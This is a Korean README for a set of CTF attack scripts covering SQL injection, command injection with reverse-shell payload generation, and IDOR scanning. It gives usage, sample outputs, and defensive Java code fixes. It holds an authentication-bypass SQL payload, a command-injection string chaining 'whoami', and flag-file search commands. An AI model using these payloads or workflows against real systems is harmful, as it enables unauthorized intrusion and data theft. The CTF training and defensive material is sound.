# 🔥 CTF 공격 스크립트 모음

이 디렉토리에는 CTF 대회용 자동화 공격 스크립트가 포함되어 있습니다.

⚠️ **경고**: 승인된 CTF 대회 환경에서만 사용하세요!

---

## 📋 스크립트 목록

### 1. sql_injection.py
SQL Injection 자동화 스크립트

**기능:**
- 로그인 우회 테스트
- 테이블 목록 추출
- 컬럼 정보 추출
- 플래그 검색
- 사용자 정보 덤프

**사용법:**
```bash
python sql_injection.py http://target.com
```

**예시 출력:**
```
[*] Testing basic SQL injection bypass...
[+] Trying: admin' OR '1'='1' --
[SUCCESS] Login bypassed with: admin' OR '1'='1' --
[*] Attempting to extract table names...
[+] Found tables:
    - MEMBER
    - GOODS
    - SECRET_FLAGS
[SUCCESS] Found flag in SECRET_FLAGS:
    FLAG{SQL_M4st3r_2024}
```

---

### 2. command_injection.py
Command Injection 자동화 스크립트

**기능:**
- Command Injection 테스트
- 시스템 정보 수집
- 플래그 파일 검색
- 민감한 파일 읽기
- 리버스 쉘 페이로드 생성

**사용법:**
```bash
# 기본 사용
python command_injection.py http://target.com

# 리버스 쉘 페이로드 포함
python command_injection.py http://target.com 10.0.0.1 4444
```

**예시 출력:**
```
[*] Testing basic command injection...
[+] Trying: ping=127.0.0.1; whoami
[SUCCESS] Command executed: 127.0.0.1; whoami
[OUTPUT] root
[*] Searching for flag files...
[+] Executing: find /tmp -name '*flag*' 2>/dev/null
[SUCCESS] Flag found!
    FLAG{C0mm4nd_Pwn3r_2024}
```

---

### 3. idor_scanner.py
IDOR 취약점 스캐너

**기능:**
- 주문 번호 범위 스캔
- 플래그 자동 탐지
- 주문 정보 추출
- 패턴 기반 스캔
- 결과 파일 저장

**사용법:**
```bash
# 기본 사용 (1-100 스캔)
python idor_scanner.py http://target.com

# 범위 지정
python idor_scanner.py http://target.com 1 1000

# 세션 쿠키 포함
python idor_scanner.py http://target.com 1 100 ABC123XYZ
```

**예시 출력:**
```
[*] Scanning order numbers from 1 to 100...
[+] Order 1: Found valid order
    Name: 홍길동
    Phone: 010-1234-5678
[+] Order 999: Found valid order
[SUCCESS] Flag found in order 999:
    FLAG{1D0R_Hunt3r_2024}
Scan completed!
Found 15 accessible orders
Found 1 flags
```

---

## 🚀 빠른 시작

### 사전 요구사항

```bash
# Python 3.6 이상 필요
python --version

# requests 라이브러리 설치
pip install requests
```

### 실행 권한 부여 (Linux/Mac)

```bash
chmod +x sql_injection.py
chmod +x command_injection.py
chmod +x idor_scanner.py
```

---

## 📊 공격 시나리오

### 시나리오 1: SQL Injection으로 플래그 획득

```bash
# 1단계: SQL Injection 스크립트 실행
python sql_injection.py http://target.com

# 2단계: 출력에서 플래그 확인
# FLAG{SQL_M4st3r_2024}
```

### 시나리오 2: Command Injection으로 시스템 장악

```bash
# 1단계: Command Injection 테스트
python command_injection.py http://target.com

# 2단계: 플래그 파일 찾기
# FLAG{C0mm4nd_Pwn3r_2024}

# 3단계: 리버스 쉘 (수동)
# 출력된 페이로드를 사용하여 리버스 쉘 연결
```

### 시나리오 3: IDOR로 숨겨진 주문 찾기

```bash
# 1단계: 작은 범위로 테스트
python idor_scanner.py http://target.com 1 100

# 2단계: 플래그가 없으면 더 큰 범위 스캔
python idor_scanner.py http://target.com 1 10000

# 3단계: 특정 패턴 시도
# 스크립트가 자동으로 999, 1337 등 특수 번호 시도
```

---

## 🔧 고급 사용법

### SQL Injection - 커스텀 페이로드

스크립트를 수정하여 커스텀 페이로드 추가:

```python
# sql_injection.py 수정
payloads = [
    ("admin' OR '1'='1' --", "anything"),
    ("YOUR_CUSTOM_PAYLOAD", "anything"),
]
```

### Command Injection - 특정 명령어 실행

```python
from command_injection import CommandInjectionAttacker

attacker = CommandInjectionAttacker("http://target.com")
result = attacker.execute_command("cat /path/to/flag.txt")
print(result)
```

### IDOR Scanner - 특정 번호만 스캔

```python
from idor_scanner import IDORScanner

scanner = IDORScanner("http://target.com")
results = scanner.scan_specific_orders([999, 1337, 9999])
```

---

## 📝 결과 파일

### idor_results.txt
IDOR 스캐너가 생성하는 결과 파일:

```
============================================================
IDOR Scan Results
============================================================

Total orders found: 15
Order numbers: [1, 2, 5, 10, 15, 20, 25, 50, 100, 999, ...]

Flags Found:
  Order 999: FLAG{1D0R_Hunt3r_2024}
```

---

## 🛡️ 방어 기법 학습

각 스크립트가 성공하는 이유를 이해하면 방어 방법도 배울 수 있습니다:

### SQL Injection 방어
```java
// 취약한 코드
String query = "SELECT * FROM MEMBER WHERE ID = '" + userId + "'";

// 안전한 코드
PreparedStatement pstmt = conn.prepareStatement("SELECT * FROM MEMBER WHERE ID = ?");
pstmt.setString(1, userId);
```

### Command Injection 방어
```java
// 취약한 코드
Runtime.getRuntime().exec("ping " + userInput);

// 안전한 코드
if (!userInput.matches("^[0-9.]+$")) {
    throw new IllegalArgumentException("Invalid input");
}
```

### IDOR 방어
```java
// 취약한 코드
String orderNo = request.getParameter("order_no");
Order order = orderService.getOrder(orderNo);

// 안전한 코드
String orderNo = request.getParameter("order_no");
String memberId = session.getAttribute("MEMBER_ID");
Order order = orderService.getOrder(orderNo);
if (!order.getMemberId().equals(memberId)) {
    throw new UnauthorizedException();
}
```

---

## 🎯 CTF 팁

### 효율적인 플래그 찾기

1. **SQL Injection 먼저 시도**
   - 가장 빠르게 데이터베이스 접근 가능
   - 테이블 구조 파악 후 플래그 테이블 찾기

2. **Command Injection으로 시스템 탐색**
   - `/tmp`, `/home`, `/root` 디렉토리 확인
   - `find` 명령어로 플래그 파일 검색

3. **IDOR로 숨겨진 데이터 접근**
   - 특수한 번호 (999, 1337, 9999) 우선 시도
   - 범위 스캔으로 모든 가능성 확인

---

## ⚠️ 주의사항

1. **승인된 환경에서만 사용**
   - CTF 대회나 허가받은 테스트 환경에서만 실행
   - 무단 사용은 불법이며 법적 처벌 대상

2. **DoS 공격 방지**
   - 너무 빠른 속도로 요청하지 않기
   - 스크립트에 딜레이 추가 권장

3. **데이터 보호**
   - 실제 사용자 데이터 노출 주의
   - 테스트 후 결과 파일 안전하게 삭제

4. **로그 확인**
   - 공격 시도가 로그에 남음
   - CTF 운영자가 모니터링할 수 있음

---

## 🤝 기여

새로운 공격 스크립트나 개선 사항이 있다면:

1. 새로운 스크립트 작성
2. 이 README에 문서 추가
3. 테스트 후 제출

---

## 📚 추가 학습 자료

- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [PortSwigger Web Security Academy](https://portswigger.net/web-security)
- [HackTricks](https://book.hacktricks.xyz/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings)

---

## 📞 문의

스크립트 사용 중 문제가 있거나 질문이 있다면 이슈를 등록해주세요.

**Happy Hacking! 🎯**
